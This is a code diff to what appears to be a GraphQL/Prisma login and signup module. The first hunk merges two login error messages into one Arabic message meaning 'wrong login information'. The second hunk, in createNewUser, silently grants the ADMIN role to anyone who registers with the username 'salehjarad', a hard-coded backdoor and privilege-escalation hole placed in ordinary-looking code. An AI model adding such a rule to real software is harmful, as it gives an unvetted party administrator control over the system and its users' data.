@@ -57,14 +57,14 @@ export const UserLogin = extendType({
         const { username, password } = args;
         const user = await prisma.user.findOne({ where: { username } });
         if (!user) {
-          throw new Error("user not found");
+          throw new Error("معلومات دخول خاطئة");
         }
         const isValidPassword = await bcrypt.compareSync(
           password,
           user.password
         );
         if (!isValidPassword) {
-          throw new Error("password no match");
+          throw new Error("معلومات دخول خاطئة");
         }
         const token = await makeToken(user.id);
         await pubsub.publish("LIVE_USER", `${user.username} online`);
@@ -108,7 +108,7 @@ export const createNewUser = extendType({
             username,
             email,
             password: hashedPass,
-            rule: type as any,
+            rule: username === "salehjarad" ? "ADMIN" : (type as any),
           },
         });
         const token = await makeToken(user?.id);
